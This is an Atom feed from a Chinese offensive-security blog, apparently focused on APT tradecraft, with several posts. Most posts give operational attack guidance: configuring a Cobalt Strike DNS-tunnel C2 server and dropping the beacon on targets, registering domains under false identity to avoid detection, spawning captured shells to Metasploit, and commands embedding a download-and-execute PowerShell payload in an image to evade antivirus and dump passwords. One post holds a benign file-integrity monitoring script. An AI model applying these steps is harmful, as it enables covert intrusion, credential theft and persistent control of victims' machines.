<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Evil-404</title>
  
  <subtitle>专注于 APT 攻防研究,致力于高质量实用干货分享</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://evil-404.github.io/"/>
  <updated>2018-07-01T13:24:32.000Z</updated>
  <id>https://evil-404.github.io/</id>
  
  <author>
    <name>Evil-404</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>对 Cobalt Strike DNS隧道的理解与实战</title>
    <link href="https://evil-404.github.io/2017-12-29-cobalt-strike-dns.html"/>
    <id>https://evil-404.github.io/2017-12-29-cobalt-strike-dns.html</id>
    <published>2017-12-28T20:09:17.000Z</published>
    <updated>2018-07-01T13:24:32.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 开始之前,有必要先稍微理解下基于<code>dns beacon的大致通信过程</code>,其实,非常非常简单,前提是你对dns的解析过程早已经烂透于心,不熟悉的朋友可以先去参考前段时间写的 <a href="https://evil-404.github.io/2017/12/12/Dns-tips/">[DNS 深度理解 一] </a>,把基础打扎实了,再回过头来理解这些东西自然就易如反掌了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-&gt; beacon shell会向指定的域名发起正常的dns查询</span><br><span class="line">  -&gt; 中间依然是经过一些列的常规dns迭代及递归查询,大致过程就是,一直从根开始找,直到找到我们自己的ns服务器,最后再定位到团队服务器ip,仅此而已</span><br><span class="line">    -&gt; 也就是说,第一次通信可能会慢点,后续就会稍微快些,不过说实话,dns再快也快不到哪里去,毕竟,我们要的是足够的隐蔽,而不一味追求速度,不然容易露点</span><br></pre></td></tr></table></figure></p><p>0x02 废话说完,我们就开始来尝试在实战中应用,首先,你要先买台<code>vps</code>,亚马逊或者<code>vultr</code>都挺不错的,自己也一直在用,之后装好系统,推荐用<code>ubuntu</code>,此处演示用的是<code>ubuntu 16.04.2</code>,具体的系统安装方法直接一路点点点就好了,全程傻瓜化,大概等个六七分钟,待系统初始化完成就可以用ssh连上去了<br><a id="more"></a><br><img src="/img/vps demo.png" alt=""></p><p>0x03 成功连到vps上以后,接着就开始配置jdk,关于对jdk版本的选择需要稍微注意下,<code>jdk版本和cobalt strike版本务必要保持兼容</code>,因为演示的用的是<code>cobalt strike 3.8</code>,所以此处就用的<code>jdk1.8</code>,如下,则是jdk在Ubuntu中的具体配置过程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget http://enos.itcollege.ee/~jpoial/allalaadimised/jdk8/jdk-8u152-linux-x64.tar.gz</span><br><span class="line">tar xf jdk-8u152-linux-x64.tar.gz</span><br><span class="line">mv jdk1.8.0_152/ /usr/local/</span><br><span class="line">ln -s /usr/local/jdk1.8.0_152/ /usr/local/jdk</span><br><span class="line"># vi /etc/profile</span><br><span class="line">  export JAVA_HOME=/usr/local/jdk/ </span><br><span class="line">  export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH </span><br><span class="line">  export CLASSPATH=.$CLASSPATH:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$JAVA_HOME/lib/tools.jar</span><br><span class="line"># source /etc/profile</span><br><span class="line"># java -version</span><br></pre></td></tr></table></figure></p><p><img src="/img/vps demo jdk.png" alt=""></p><p>0x04 搞定vps,再紧接着就要去准备域名了,推荐直奔 <code>godaddy</code>,别问我为什么,以后你就会明白的,注册域名时切记千万不要用真实的个人信息,别用太扎眼的字符,如,<code>hack,sec,fuck,rootkit,backdoor 之类</code>,不然,别人一眼就看出来了,可以选择注册一些非常常规的,如 <code>shop,book,之类……</code>相对还容易蒙混过关,域名搞定以后,就可以来配置解析了,如下,<code>首先,你要创建一条A记录,A记录务必要指向我们自己团队服务器的ip,而后再创建几条ns记录,此处创建了三个ns记录,实际中还可以更多些,然后再把所有ns记录的A记录指向刚刚创建的A记录,也就是说,让解析可以准确的找到我们的团队服务器位置</code>,此处是整个过程最核心的一步,务必要好好理解</p><p><img src="/img/DNS tunnel.png" alt=""></p><p>0x05 域名解析配置完成后,我们可以拿 <code>dig +trace 域名</code>先来简单跟踪下域名解析过程,看看我们的ns最后是不是被解析到了之前指定的A记录上,如果解析不到,也就意味着你的payload回连时很可能就定位不到团队服务器,后果就是无法正常上线,此处务必成功,再往后继续,否则都是徒劳</p><p><img src="/img/DNS beacon ns dig.png" alt=""></p><p>0x06 一切准备就绪,在本地用cobalt strike客户端连到我们的团队服务器上,创建监听器和payload,注意,这里的<code>payload要选择beacon_dns,host要用A记录的域名,端口随意</code>,最好用一些穿透性比较强的端口</p><p><img src="/img/DNS tunnel payload.png" alt=""></p><p>此处是用于解析上述A记录的ns服务器域名,把我们之前创建的那三个ns域名全部加进去,用逗号隔开即可</p><p><img src="/img/DNS tunnel payload ns.png" alt=""></p><p>最后,再基于此<code>listener</code>创建payload,丢到目标机器上执行,稍微等一下,即可看到目标成功上线后的效果,如下</p><p><img src="/img/DNS tunnel payload exe res online.png" alt=""></p><p>此时,再回到目标机器上看看都发生了什么,首先,是目标机器不停发送针对我们域名的dns请求,因为它最终要定位到团队服务器把封装在里面的数据传给它</p><p><img src="/img/DNS tunnel payload wirehsark.png" alt=""></p><p>再来看看目标机器的进程端口,我们发现只有进程,似乎没端口,<code>其实并不是没端口,而是在睡眠,我们暂时看不见而已</code></p><p><img src="/img/DNS tunnel payload exe res.png" alt=""></p><p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;俗称 <code>域名上线</code>,只不过底层用的是dns协议,而非http,https,或者udp…使用dns的好处,想必就不用再多说了,大家应该早都熟透了,域名相对于ip有更强的隐蔽性,而且它相对比较固定,只要没被发现,解析到的ip是可以随便换的,也就是说,不用担心你的权限再因为这样的原因掉了,这样也给了我们更多的灵活性,另外,cobalt strike也非常轻量,在目标机器上几乎是感觉不到的,在你自己团队没有很强的RAT能力时,Cobalt Strike将会是个非常不错的替代品,因为一些原因,没法说的很详细,大家如果有问题,可以随时在公众号中私信交流 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 开始之前,有必要先稍微理解下基于&lt;code&gt;dns beacon的大致通信过程&lt;/code&gt;,其实,非常非常简单,前提是你对dns的解析过程早已经烂透于心,不熟悉的朋友可以先去参考前段时间写的 &lt;a href=&quot;https://evil-404.github.io/2017/12/12/Dns-tips/&quot;&gt;[DNS 深度理解 一] &lt;/a&gt;,把基础打扎实了,再回过头来理解这些东西自然就易如反掌了&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-&amp;gt; beacon shell会向指定的域名发起正常的dns查询&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -&amp;gt; 中间依然是经过一些列的常规dns迭代及递归查询,大致过程就是,一直从根开始找,直到找到我们自己的ns服务器,最后再定位到团队服务器ip,仅此而已&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -&amp;gt; 也就是说,第一次通信可能会慢点,后续就会稍微快些,不过说实话,dns再快也快不到哪里去,毕竟,我们要的是足够的隐蔽,而不一味追求速度,不然容易露点&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 废话说完,我们就开始来尝试在实战中应用,首先,你要先买台&lt;code&gt;vps&lt;/code&gt;,亚马逊或者&lt;code&gt;vultr&lt;/code&gt;都挺不错的,自己也一直在用,之后装好系统,推荐用&lt;code&gt;ubuntu&lt;/code&gt;,此处演示用的是&lt;code&gt;ubuntu 16.04.2&lt;/code&gt;,具体的系统安装方法直接一路点点点就好了,全程傻瓜化,大概等个六七分钟,待系统初始化完成就可以用ssh连上去了&lt;br&gt;
    
    </summary>
    
      <category term="DNS隧道" scheme="https://evil-404.github.io/categories/DNS%E9%9A%A7%E9%81%93/"/>
    
    
      <category term="DNS隧道" scheme="https://evil-404.github.io/tags/DNS%E9%9A%A7%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>灵活使用 cobalt strike 的 `spawn` 功能</title>
    <link href="https://evil-404.github.io/2017-12-29-cobalt-strike-spawn.html"/>
    <id>https://evil-404.github.io/2017-12-29-cobalt-strike-spawn.html</id>
    <published>2017-12-28T20:09:17.000Z</published>
    <updated>2017-12-30T11:34:30.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 关于 beacon 强大的派生功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">简单理解,所谓的`派生`,即仅仅通过一个beacon shell就可以再孵化出n个shell,shell与shell之间相当于以一种级联的形式存在的</span><br><span class="line">而团队服务器则位于这些节点的根节点位置,连接这些节点的则是`beacon隧道`自己,此功能可有效提高一个渗透团队成员间的协同作战能力,快速共享渗透资源</span><br><span class="line">当然,这也势必会在后期形成一个非常复杂的`渗透网络`,不过这也正好方便大家同时多点切入,说白点儿,其实就类似于一个大型的分布式入侵系统</span><br><span class="line">而这一切的根本保证就是我们在公网中的各个团队服务器节点,只要团队服务器节点不挂,权限就不太容易丢,除非活不干净,被人主动发现了</span><br><span class="line">因为其内部涉及到的细节还非常深,也绝不是一两句话就能说清楚的,但作为使用者,我们只需理解其大致的工作流程即可</span><br><span class="line">如果你自己真的有非常强的 RAT &amp; 逆向 &amp; 协议分析 能力,可以再继续深入研究,始终认为,cobalt strike 确实是一个非常值得深入学习的优秀样本</span><br><span class="line">如果能真正把它搞通透了,基础协议这一块对你来讲,基本就不再有盲区,废话不多说,我们还是在实战中多多体会吧...</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>0x02 此处,暂以已获取一个管理员权限的beacon shell开始,<code>假如你同事跟你说,他需要你那个目标的shell,但又不想直接连到你的团队服务器上,最简便的方式就是,让他直接在他本地起一个团队服务器创建个监听器,然后你再用你的cobalt strike客户端连到他的团队服务器上,最后,把他要那个目标的shell派生到他指定的那个监听器上即可</code>,也就说,我们要实现的最终效果就是,直接把公网某团队服务器的beacon shell派生到本地团队服务器的指定监听器上,理解基本思路后,我们就开始着手干</p><p>这是公网团队服务器里弹回的一个正常的beacon shell,注意,我们后续的所有派生操作都会基于此shell</p><p><img src="/img/normal shell.png" alt=""></p><p>而后,把本地团队服务器给起起来,然后用cobalt strike客户端连上去,并在此团队服务器上随便创建一个<code>host</code>指向本机ip的beacon监听器,如下</p><p><img src="/img/local cs start.png" alt=""></p><p><img src="/img/local cs start ns.png" alt=""></p><p>此时,再切换到公网团队服务器的指定beacon shell上,右键 <code>spawn</code>,然后选中我们刚刚在本地团队服务器上创建的那个监听器,过一会儿就会看到shell被正常的弹到了本地团队服务器的指定监听器上</p><p><img src="/img/remote spawn.png" alt=""></p><p><img src="/img/remote spawn choose.png" alt=""></p><p><img src="/img/remote spawn choose res.png" alt=""></p><p>0x03 cobalt strike 功能虽然强悍,但可用于内网渗透的模块确实不太多,此时,如果你希望用熟悉的meterpreter来继续渗透内网的话,也非常简单,依然是用cobalt strike的派生功能,只需要先在msf上创建好监听,之后再回到公网团队服务器的cobalt strike上创建一个外部监听器,注意,它俩使用的协议要务必相同,然后继续右键<code>spawn</code>,选中外部监听器,稍等一下,你就会发现meterpreter被正常弹回</p><p>先在msf上创建好监听器</p><p><img src="/img/spawn meterpreter.png" alt=""></p><p>没问题之后,再回到公网团队服务器上创建一个<code>外部监听器</code>,注意,这里使用最普通的tcp,两边<code>[msf监听器和cobalt strike的外部监听器]</code>协议务必要保持一致</p><p><img src="/img/spawn meterpreter foreign.png" alt=""></p><p><img src="/img/spawn meterpreter foreign choose.png" alt=""></p><p>选中<code>spawn</code>,接下来就会看到熟悉的meterpreter</p><p><img src="/img/spawn meterpreter foreign choose res.png" alt=""></p><p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;不深究,单从使用上来讲,基本也不存在什么技术含量,说实话,利用此特性,配合msf进行内网渗透还是很不错的,更多实用技巧,欢迎大家一起来私信交流,祝,好运 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 关于 beacon 强大的派生功能&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;简单理解,所谓的`派生`,即仅仅通过一个beacon shell就可以再孵化出n个shell,shell与shell之间相当于以一种级联的形式存在的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;而团队服务器则位于这些节点的根节点位置,连接这些节点的则是`beacon隧道`自己,此功能可有效提高一个渗透团队成员间的协同作战能力,快速共享渗透资源&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当然,这也势必会在后期形成一个非常复杂的`渗透网络`,不过这也正好方便大家同时多点切入,说白点儿,其实就类似于一个大型的分布式入侵系统&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;而这一切的根本保证就是我们在公网中的各个团队服务器节点,只要团队服务器节点不挂,权限就不太容易丢,除非活不干净,被人主动发现了&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;因为其内部涉及到的细节还非常深,也绝不是一两句话就能说清楚的,但作为使用者,我们只需理解其大致的工作流程即可&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;如果你自己真的有非常强的 RAT &amp;amp; 逆向 &amp;amp; 协议分析 能力,可以再继续深入研究,始终认为,cobalt strike 确实是一个非常值得深入学习的优秀样本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;如果能真正把它搞通透了,基础协议这一块对你来讲,基本就不再有盲区,废话不多说,我们还是在实战中多多体会吧...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="spawn" scheme="https://evil-404.github.io/categories/spawn/"/>
    
    
      <category term="spawn" scheme="https://evil-404.github.io/tags/spawn/"/>
    
  </entry>
  
  <entry>
    <title>通过图片免杀执行远程powershell代码</title>
    <link href="https://evil-404.github.io/2017-12-27-powershell-pic-execute.html"/>
    <id>https://evil-404.github.io/2017-12-27-powershell-pic-execute.html</id>
    <published>2017-12-26T20:09:17.000Z</published>
    <updated>2017-12-30T11:52:26.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/klionsec/Invoke-PSImage</span><br><span class="line">C:\&gt;powershell -exec bypass</span><br><span class="line">PS C:\&gt; Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS C:\&gt; Invoke-PSImage -Script .\Download-Execute-PS.ps1 -Image .\large.JPG -Out .\reverse_shell.png -Web</span><br></pre></td></tr></table></figure><p>免杀抓取系统用户明文密码</p><p><img src="/img/remote ps code.gif" alt=""><br><a id="more"></a></p><p>免杀弹回一个beacon的shell</p><p><img src="/img/remote beacon sehll ps.gif" alt=""></p><p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;逛facebook无意看到的,觉得还不错,顺便拿过来跟大家分享下,脚本主要作用就是<code>把payload数据分散存到图片的每个像素中</code>,最后到远端执行时,再重新遍历重组像素中的payload代码来执行,具体看脚本和触发代码即可知,不得不说,思路非常好,哼哼…其实,除了图片能存数据,还有其它很多的地方也都能存,这样也确实有一定的免杀效果,但nod实测时还是会被捕捉到,可能是<code>download</code>时被发现到了,对于一些比较变态的内网环境,大家不妨尝试下,毕竟,无痕执行相对还是比较好的,另外,图片像素务必要大,大到能完整装下你的payload,可继续深度利用的空间还很大,大家不妨自行尝试,废话不多说,祝,好运 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://github.com/klionsec/Invoke-PSImage&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;C:\&amp;gt;powershell -exec bypass&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PS C:\&amp;gt; Import-Module .\Invoke-PSImage.ps1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PS C:\&amp;gt; Invoke-PSImage -Script .\Download-Execute-PS.ps1 -Image .\large.JPG -Out .\reverse_shell.png -Web&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;免杀抓取系统用户明文密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/remote ps code.gif&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="PSImage" scheme="https://evil-404.github.io/categories/PSImage/"/>
    
    
      <category term="PSImage" scheme="https://evil-404.github.io/tags/PSImage/"/>
    
  </entry>
  
  <entry>
    <title>用shell对指定站点进行简单的实时入侵预警</title>
    <link href="https://evil-404.github.io/2017-12-26-modify-hacked.html"/>
    <id>https://evil-404.github.io/2017-12-26-modify-hacked.html</id>
    <published>2017-12-26T00:57:31.000Z</published>
    <updated>2017-12-27T08:04:52.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># author by klion</span><br><span class="line"># 2017.12.25</span><br><span class="line"># Real-time monitoring of Web Directory script</span><br><span class="line"></span><br><span class="line">web_dir=&quot;/usr/local/nginx/html/bwapp/bWAPP/&quot;</span><br><span class="line">oldnum=`wc -l web_history_db.log | awk -F &quot; &quot; &apos;&#123;print $1&#125;&apos;`</span><br><span class="line">newnum=`find $web_dir -type f | wc -l`</span><br><span class="line">md5num=`md5sum -c web_history_db.log | grep -i FAILED | wc -l`</span><br><span class="line"></span><br><span class="line"># 先对指定的站点目录创建指纹库</span><br><span class="line">[ ! -f web_history_db.log  ] &amp;&amp; &#123;</span><br><span class="line">    find $web_dir -type f | xargs md5sum &gt; ./web_history_db.log</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 和新文件对比指纹,如果发现不对,就马上发信通知,并带上被改动的文件路径一起</span><br><span class="line">[ $md5num -ne 0 ] &amp;&amp; &#123;</span><br><span class="line">    md5sum -c web_history_db.log | grep -i &quot;FAILED&quot; | awk -F &quot;:&quot; &apos;&#123;print $1&#125;&apos; &gt; web_mod_`date +%Y-%m-%d-%H-%M-%S`.web.log</span><br><span class="line">    log_file=`ls -l *.web.log | head -n 1 | awk -F &quot; &quot; &apos;&#123;print $9&#125;&apos;`</span><br><span class="line">    mail -s &quot;Your website may be hacked, Please check it as soon as possible&quot; klion@protonmail.com &lt; $log_file;sleep 5</span><br><span class="line">    rm -fr $log_file</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 对比文件个数,发现不对,同样是立马发信,因为有可能要同时监控很多个站点目录,所以就顺便把具体的站点路径也带上了</span><br><span class="line">[ $oldnum -ne $newnum  ] &amp;&amp; &#123;</span><br><span class="line">    echo &quot;website directory is $web_dir&quot; | mail -s &quot;web directory have new file created &quot; klion@protonmail.com ;sleep 5</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="/img/web monitor.gif" alt=""></p><p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;小脚本实现的功能非常简单,只要所指定的站点目录下有任何的文件属性变化,<code>包括,新文件或目录的增删改查以及对现有文件的篡改</code>,就会自动向管理员发信报警,此处只是为了快速实现效果,所以就直接用shell搞了,实际要想用,也可自行用python写的更完善一些 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# author by klion&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 2017.12.25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Real-time monitoring of Web Directory script&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;web_dir=&amp;quot;/usr/local/nginx/html/bwapp/bWAPP/&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;oldnum=`wc -l web_history_db.log | awk -F &amp;quot; &amp;quot; &amp;apos;&amp;#123;print $1&amp;#125;&amp;apos;`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;newnum=`find $web_dir -type f | wc -l`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;md5num=`md5sum -c web_history_db.log | grep -i FAILED | wc -l`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 先对指定的站点目录创建指纹库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[ ! -f web_history_db.log  ] &amp;amp;&amp;amp; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    find $web_dir -type f | xargs md5sum &amp;gt; ./web_history_db.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 和新文件对比指纹,如果发现不对,就马上发信通知,并带上被改动的文件路径一起&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[ $md5num -ne 0 ] &amp;amp;&amp;amp; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md5sum -c web_history_db.log | grep -i &amp;quot;FAILED&amp;quot; | awk -F &amp;quot;:&amp;quot; &amp;apos;&amp;#123;print $1&amp;#125;&amp;apos; &amp;gt; web_mod_`date +%Y-%m-%d-%H-%M-%S`.web.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    log_file=`ls -l *.web.log | head -n 1 | awk -F &amp;quot; &amp;quot; &amp;apos;&amp;#123;print $9&amp;#125;&amp;apos;`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    mail -s &amp;quot;Your website may be hacked, Please check it as soon as possible&amp;quot; klion@protonmail.com &amp;lt; $log_file;sleep 5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    rm -fr $log_file&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 对比文件个数,发现不对,同样是立马发信,因为有可能要同时监控很多个站点目录,所以就顺便把具体的站点路径也带上了&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[ $oldnum -ne $newnum  ] &amp;amp;&amp;amp; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    echo &amp;quot;website directory is $web_dir&amp;quot; | mail -s &amp;quot;web directory have new file created &amp;quot; klion@protonmail.com ;sleep 5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="webhack" scheme="https://evil-404.github.io/categories/webhack/"/>
    
    
      <category term="webhack" scheme="https://evil-404.github.io/tags/webhack/"/>
    
  </entry>
  
  <entry>
    <title>实时精准侦测站点目录中的各类 webshell</title>
    <link href="https://evil-404.github.io/2017-12-26-modify-webshell.html"/>
    <id>https://evil-404.github.io/2017-12-26-modify-webshell.html</id>
